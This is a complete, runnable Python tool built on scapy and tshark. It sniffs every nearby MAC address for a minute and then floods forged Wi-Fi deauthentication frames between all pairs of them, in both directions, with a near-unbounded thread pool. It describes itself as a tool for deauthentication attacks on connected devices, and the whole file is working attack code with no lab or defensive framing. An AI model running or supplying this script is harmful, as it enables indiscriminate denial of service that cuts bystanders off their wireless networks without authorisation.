from scapy.all import *
import concurrent.futures
import time
import subprocess
import re
import argparse

def deauth(target_mac, access_point_mac, interface, packet_count, interval):
    print("deauth: router:{}, device:{}".format(access_point_mac, target_mac))
    conf.iface = interface
    pkt = (
        RadioTap() /
        Dot11(addr1=target_mac, addr2=access_point_mac, addr3=access_point_mac) /
        Dot11Deauth()
    )
    sendp(pkt, inter=interval, count=packet_count, verbose=0)

def capture_mac_addresses(interface):
    tshark_cmd = f"tshark -i {interface} -I -a duration:60"
    tshark_process = subprocess.Popen(tshark_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    mac_regex = r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})"
    mac_addresses = []
    for line in iter(tshark_process.stdout.readline, b''):
        line = line.decode('utf-8')
        mac_matches = re.findall(mac_regex, line)
        if mac_matches:
            mac_addresses.extend(mac_matches)
    return set(mac_addresses)

def run_deauth_attacks(maccy, interface, packet_count, interval):
    with concurrent.futures.ThreadPoolExecutor(max_workers=99999) as executor:
        for wifi in maccy:
            for device in maccy:
                try:
                    executor.submit(deauth, device, wifi, interface, packet_count, interval)
                    executor.submit(deauth, wifi, device, interface, packet_count, interval)
                except Exception as e:
                    print(f"Exception occurred: {e}")
                    time.sleep(60)
                    executor.submit(deauth, device, wifi, interface, packet_count, interval)
                    executor.submit(deauth, wifi, device, interface, packet_count, interval)

def main():
    parser = argparse.ArgumentParser(description='Perform deauthentication attacks on devices connected to a Wi-Fi network.')
    parser.add_argument('-i', '--interface',type=str, default='en0', help='Network interface to use for the attack')
    parser.add_argument('-c', '--count', type=int, default=100, help='Number of deauthentication packets to send per attack (default: 100)')
    parser.add_argument('-d', '--interval', type=float, default=0.1, help='Interval between deauthentication packets (default: 0.1)')
    args = parser.parse_args()

    disconnect_cmd = f"networksetup -setairportpower {args.interface} off"
    subprocess.run(disconnect_cmd, shell=True)
    disconnect_cmd = f"networksetup -setairportpower {args.interface} on"
    subprocess.run(disconnect_cmd, shell=True)

    mac_addresses = capture_mac_addresses(args.interface)
    run_deauth_attacks(mac_addresses, args.interface, args.count, args.interval)

if __name__ == '__main__':
    main()
